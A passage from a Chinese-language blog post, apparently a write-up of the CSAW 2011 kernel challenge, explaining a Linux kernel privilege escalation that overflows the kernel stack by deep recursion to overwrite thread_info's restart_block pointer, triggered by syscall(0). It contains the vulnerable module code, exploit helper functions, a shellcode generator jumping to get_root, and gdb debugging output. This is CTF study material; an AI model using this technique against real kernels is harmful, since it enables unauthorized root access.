nanosleep;</span><br><span class="line">		&#x2F;* For poll *&#x2F;</span><br><span class="line">		struct &#123;</span><br><span class="line">			struct pollfd __user *ufds;</span><br><span class="line">			int nfds;</span><br><span class="line">			int has_timeout;</span><br><span class="line">			unsigned long tv_sec;</span><br><span class="line">			unsigned long tv_nsec;</span><br><span class="line">		&#125; poll;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>需要关注的是第一个函数指针，先来看下是否可以触发这个指针，在kernel/signal.c中发现可以通过restart_syscall函数来调用restart_block的fn指向的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE0(restart_syscall)</span><br><span class="line">&#123;</span><br><span class="line">    struct restart_block *restart &#x3D; &amp;current_thread_info()-&gt;restart_block;</span><br><span class="line">    return restart-&gt;fn(restart);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而在arch/x86/kernel/syscall_table_32.S中定义了restart_syscall的系统调用号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.long sys_restart_syscall &#x2F;* 0 - old &quot;setup()&quot; system call, used for restarting *&#x2F;</span><br></pre></td></tr></table></figure>

<p>也就是说我们可以通过syscall（0）就能触发到这个fn指向的函数了，那如果可以破坏thread_info的restart_block成员中的函数指针，将其指向我们控制下的用户空间中的函数，那么就可以劫持程序流了。</p>
<p>以上就是大致的原理部分，程序本身是一个加密解密模块，这不是我们关注的重点，重点在于我们是否能够在内核空间将使用地址覆盖到thread_info，直接分配大空间内存在这里无法实现，所以考虑不断分配栈帧，即找寻递归函数，在decrypt函数我们看到了一个decrypt自身的递归调用，比较明显的是round的值代表了控制解密的轮数，在这里也就是分配栈帧的次数，如果我们可以控制这个round为一个合适的较大值，那么我们就可以覆盖到thread_info了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">decrypt(uint32_t k[], char *buf, int len, int rounds)</span><br><span class="line">&#123;</span><br><span class="line">        int i;</span><br><span class="line">        if (rounds &gt;&#x3D; 0) &#123;</span><br><span class="line">                if (rounds % 3 &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                        k[0] ^&#x3D; k[1]; k[1] ^&#x3D; k[0]; k[0] ^&#x3D; k[1];</span><br><span class="line">                        k[2] ^&#x3D; k[3]; k[3] ^&#x3D; k[2]; k[2] ^&#x3D; k[3];</span><br><span class="line">                &#125; else if (rounds % 3 &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                        k[0] ^&#x3D; k[2]; k[2] ^&#x3D; k[0]; k[0] ^&#x3D; k[2];</span><br><span class="line">                        k[1] ^&#x3D; k[3]; k[3] ^&#x3D; k[1]; k[1] ^&#x3D; k[3];</span><br><span class="line">                &#125; else if (rounds % 3 &#x3D;&#x3D; 2) &#123;</span><br><span class="line">                        k[0] ^&#x3D; k[3]; k[3] ^&#x3D; k[0]; k[0] ^&#x3D; k[3];</span><br><span class="line">                        k[2] ^&#x3D; k[1]; k[1] ^&#x3D; k[2]; k[2] ^&#x3D; k[1];</span><br><span class="line">                &#125;</span><br><span class="line">                decrypt(k, buf, len, rounds-1);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">                for (i &#x3D; 0; i &lt; len &#x2F; 8; i++) &#123;</span><br><span class="line">                        descramble(k, (uint32_t *)(buf + (i * 8)), (uint32_t *) 0, (uint32_t *) DELTA);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这个round值在key_write函数中被赋值，可以看到从copy_from_user获取用户的输入，然后按照格式化字符串的填入key和rounds。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">key_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)</span><br><span class="line">&#123;</span><br><span class="line">        char buf[MAX_LENGTH];</span><br><span class="line">        printk(KERN_INFO &quot;csaw: called key_write\n&quot;);</span><br><span class="line">        memset(buf, 0, sizeof(buf));</span><br><span class="line">        if (count &gt; MAX_LENGTH) &#123;</span><br><span class="line">                count &#x3D; MAX_LENGTH;</span><br><span class="line">        &#125;</span><br><span class="line">        if (copy_from_user(&amp;buf, ubuf, count)) &#123;</span><br><span class="line">                return -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">        sscanf(buf, &quot;%16c\t%d&quot;, (char *) key, &amp;rounds);</span><br><span class="line">        return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>填充rounds和触发的函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">set_rounds(int rounds)</span><br><span class="line">&#123;</span><br><span class="line">        FILE *fp &#x3D; open_file(&quot;&#x2F;proc&#x2F;csaw2011&#x2F;key&quot;);</span><br><span class="line">        fprintf(fp, &quot;FFFFFFFFFFFFFFFF\t%d\n&quot;, rounds);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        printf(&quot;[+] Rounds set successfully\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void</span><br><span class="line">trigger_vuln(void)</span><br><span class="line">&#123;</span><br><span class="line">        FILE *fp &#x3D; open_file(&quot;&#x2F;proc&#x2F;csaw2011&#x2F;decrypt&quot;);</span><br><span class="line">        fprintf(fp, &quot;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&quot;);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        syscall(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然有点无语的是具体shellcode填充，给了x86架构的exp，然而放在androidkernel的题库里。。。shellcode就是类似于jop的思路</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* This function just does:</span><br><span class="line"> * asm(&quot;mov $get_root, %eax; jmp *%eax;&quot;);</span><br><span class="line"> *</span><br><span class="line"> * The format of these instructions is:</span><br><span class="line"> * mov addr, %eax       &#x3D;&gt; b8 little_endian(addr)</span><br><span class="line"> * jmp *%eax            &#x3D;&gt; ff e0</span><br><span class="line"> *&#x2F;</span><br><span class="line">void</span><br><span class="line">generate_shellcode(char *buf)</span><br><span class="line">&#123;</span><br><span class="line">        long *p;</span><br><span class="line">        *buf++ &#x3D; &#39;\xb8&#39;;</span><br><span class="line"></span><br><span class="line">        &#x2F;* mov $get_root, %eax *&#x2F;</span><br><span class="line">        p &#x3D; (long *)buf;</span><br><span class="line">        *p &#x3D; (long)&amp;get_root;</span><br><span class="line">        buf +&#x3D; sizeof(long *);</span><br><span class="line"></span><br><span class="line">        &#x2F;* jmp eax *&#x2F;</span><br><span class="line">        *buf++ &#x3D; &#39;\xff&#39;;</span><br><span class="line">        *buf++ &#x3D; &#39;\xe0&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我费心改成arm架构的机器码挂上去调试的时候，却突然发现不同架构的thread_info的结构体都不一样 :) </p>
<p>在linux之前的内核中，还没有lx的辅助调试选项，所以查看thread_info的方式要少麻烦些<br>首先我们需要根据栈地址拿到thread_info的地址，上文根据thread_union结构体可知可以通过程序的局部变量的地址（&amp;retval）获得内核栈的地址。又因为thread_info 位于内核栈顶部而且是 8k（或者 4k ）对齐的，所以利用 <strong>栈地址 &amp; (~(THREAD_SIZE - 1))</strong> 就可以计算出 thread_info 的地址。而THREAD_SIZE的定义在thread_info.h中, 下面是arm架构的THREAD_SIZE定义，THREAD_SIZE_ORDER和PAGE_SIZE根据架构有所不同，这里由于是arm 32位，所以THREAD_SIZE = 4096 * 2 = 0x2000</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define THREAD_SIZE_ORDER	1</span><br><span class="line">#define THREAD_SIZE		(PAGE_SIZE &lt;&lt; THREAD_SIZE_ORDER)</span><br></pre></td></tr></table></figure>

<p>就是在调试时才发现原来thread_info的结构体也不一样，猝。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p&#x2F;x $sp</span><br><span class="line">$10 &#x3D; 0xd1c4fe88</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; hex(sp&amp;(~(0x2000-1)))</span><br><span class="line">&#39;0xd1c4e000&#39;</span><br><span class="line"></span><br><span class="line">(gdb) p *(struct thread_info *) 0xd1c4e000</span><br><span class="line">$12 &#x3D; &#123;flags &#x3D; 0, preempt_count &#x3D; 0, addr_limit &#x3D; 3204448256, task &#x3D; 0xd1c38c00,</span><br><span class="line">  exec_domain &#x3D; 0xc048ca6c, cpu &#x3D; 0, cpu_domain &#x3D; 21, cpu_context &#x3D; &#123;r4 &#x3D; 3725747072,    </span><br><span class="line">    r5 &#x3D; 3519253504, r6 &#x3D; 3226005544, r7 &#x3D; 3615050560, r8 &#x3D; 3726621696, r9 &#x3D; 3519340544, </span><br><span class="line">    sl &#x3D; 3519340544, fp &#x3D; 3519348100, sp &#x3D; 3519348048, pc &#x3D; 3224796784, extra &#x3D; &#123;0, 0&#125;&#125;, </span><br><span class="line">  syscall &#x3D; 0, used_cp &#x3D; &#39;\000&#39; &lt;repeats 15 times&gt;, tp_value &#x3D; 3070189536,</span><br><span class="line">  crunchstate &#x3D; &#123;mvdx &#x3D; &#123;&#123;0, 0&#125; &lt;repeats 16 times&gt;&#125;, mvax &#x3D; &#123;&#123;0, 0, 0&#125;, &#123;0, 0, 0&#125;, &#123;0,    </span><br><span class="line">        0, 0&#125;, &#123;0, 0, 0&#125;&#125;, dspsc &#x3D; &#123;0, 0&#125;&#125;, fpstate &#x3D; &#123;hard &#x3D; &#123;save &#x3D; &#123;</span><br><span class="line">        0 &lt;repeats 35 times&gt;&#125;&#125;, soft &#x3D; &#123;save &#x3D; &#123;0 &lt;repeats 35 times&gt;&#125;&#125;&#125;, vfpstate &#x3D; &#123;     </span><br><span class="line">    hard &#x3D; &#123;fpregs &#x3D; &#123;0 &lt;repeats 32 times&gt;&#125;, fpexc &#x3D; 1073741824, fpscr &#x3D; 0, fpinst &#x3D; 0,   </span><br><span class="line">      fpinst2 &#x3D; 0&#125;&#125;, restart_block &#x3D; &#123;fn &#x3D; 0xc0028dcc &lt;do_no_restart_syscall&gt;, &#123;futex &#x3D; &#123; </span><br><span class="line">        uaddr &#x3D; 0x0, val &#x3D; 0, flags &#x3D; 0, bitset &#x3D; 0, time &#x3D; 0, uaddr2 &#x3D; 0x0&#125;,</span><br><span class="line">      nanosleep &#x3D; &#123;clockid &#x3D; 0, rmtp &#x3D; 0x0, expires &#x3D; 0&#125;, poll &#x3D; &#123;ufds &#x3D; 0x0, nfds &#x3D; 0,   </span><br><span class="line">        has_timeout &#x3D; 0, tv_sec &#x3D; 0, tv_nsec &#x3D; 0&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">其结构体就不再放了，查看task_struct的话可以看到cred的地址, 然后查看cred内的id：</span><br><span class="line">(gdb) p *(struct task_struct *)  0xd1c38c00</span><br><span class="line">...</span><br><span class="line">real_cred &#x3D; 0xde29be40, cred &#x3D; 0xde29be40,</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</div><div class="article-tags size-small is-uppercase mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/vul/">vul</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/09/26/2020-9-26-samsung%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-skia-codec%E8%A7%A3%E6%9E%90%E5%99%A8%E5%BC%95%E6%93%8E/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">samsung漏洞挖掘-skia-codec解析器引擎</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/"><span class="level-item">搭建android内核环境（顺带分析cve-2013-1763)</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="/img/kkx.jpg" alt="Dawuge"></figure><p class="title is-size-4 is-block line-height-inherit">Dawuge</p><p class="is-size-6 is-block">Never limit yourself</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>HNUer</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">33</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">18</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">5</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Dawuge" target="_blank" rel="noopener">follow 一下</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Dawuge"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/Dawuge3"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">友链</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://momomoxiaoxi.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">默小西</span></span><span class="level-right"><span class="level-item tag">momomoxiaoxi.com</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://nan01ab.github.io/archive" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">nan01ab</span></span><span class="level-right"><span class="level-item tag">nan01ab.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://n1rv0us.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">n1rv0us</span></span><span class="level-right"><span class="level-item tag">n1rv0us.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://www.wenweizeng.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">薇薇</span></span><span class="level-right"><span class="level-item tag">www.wenweizeng.com</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/ctf/"><span class="level-start"><span class="level-item">ctf</span></span><span class="level-end"><span class="level-item tag">10</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/ctf/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/fuzz/"><span class="level-start"><span class="level-item">fuzz</span></span><span class="level-end"><span class="level-item tag">6</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/fuzz/android/"><span class="level-start"><span class="level-item">android</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/fuzz/kernel/"><span class="level-start"><span class="level-item">kernel</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/fuzz/normal/"><span class="level-start"><span class="level-item">normal</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/notes/"><span class="level-start"><span class="level-item">notes</span></span><span class="level-end"><span class="level-item tag">10</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/notes/android/"><span class="level-start"><span class="level-item">android</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/notes/env/"><span class="level-start"><span class="level-item">env</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/notes/hardware/"><span class="level-start"><span class="level-item">hardware</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/notes/linux/"><span class="level-start"><span class="level-item">linux</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/vul/"><span class="level-start"><span class="level-item">vul</span></span><span class="level-end"><span class="level-item tag">5</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/vul/android/"><span class="level-start"><span class="level-item">android</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/vul/android/fuzz/"><span class="level-start"><span class="level-item">fuzz</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/vul/android/kernel/"><span class="level-start"><span class="level-item">kernel</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/vul/android/software/"><span class="level-start"><span class="level-item">software</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/vul/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">1</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/vul/windows/software/"><span class="level-start"><span class="level-item">software</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li></ul></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag is-grey-lightest">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/notes/"><span class="tag">notes</span><span class="tag is-grey-lightest">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vul/"><span class="tag">vul</span><span class="tag is-grey-lightest">5</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2099-12-31T16:00:00.000Z">2100-01-01</time></p><p class="title is-6"><a class="link-muted" href="/2100/01/01/2100-1-1-dailyrecord/">日志</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2098-12-31T16:00:00.000Z">2099-01-01</time></p><p class="title is-6"><a class="link-muted" href="/2099/01/01/2099-1-1-cundang/">在其他平台放置的文章</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-09-26T01:55:47.000Z">2020-09-26</time></p><p class="title is-6"><a class="link-muted" href="/2020/09/26/2020-9-26-samsung%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-skia-codec%E8%A7%A3%E6%9E%90%E5%99%A8%E5%BC%95%E6%93%8E/">samsung漏洞挖掘-skia-codec解析器引擎</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/vul/">vul</a> / <a class="link-muted" href="/categories/vul/android/">android</a> / <a class="link-muted" href="/categories/vul/android/fuzz/">fuzz</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-03-31T16:00:00.000Z">2020-04-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/01/android%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BA%8C/">android kernel exploit第二弹</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/vul/">vul</a> / <a class="link-muted" href="/categories/vul/android/">android</a> / <a class="link-muted" href="/categories/vul/android/kernel/">kernel</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-02-29T16:00:00.000Z">2020-03-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/">搭建android内核环境（顺带分析cve-2013-1763)</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/vul/">vul</a> / <a class="link-muted" href="/categories/vul/android/">android</a> / <a class="link-muted" href="/categories/vul/android/kernel/">kernel</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2100/01/"><span class="level-start"><span class="level-item">一月 2100</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2099/01/"><span class="level-start"><span class="level-item">一月 2099</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/09/"><span class="level-start"><span class="level-item">九月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/12/"><span class="level-start"><span class="level-item">十二月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/09/"><span class="level-start"><span class="level-item">九月 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/08/"><span class="level-start"><span class="level-item">八月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/06/"><span class="level-start"><span class="level-item">六月 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/05/"><span class="level-start"><span class="level-item">五月 2019</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/avatar.png" alt="Dawuge&#039;s blog" height="28"></a><p class="size-small"><span>&copy; 2020 Dawuge</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'http://yoursite.com',
                external_link: {"enable":true,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>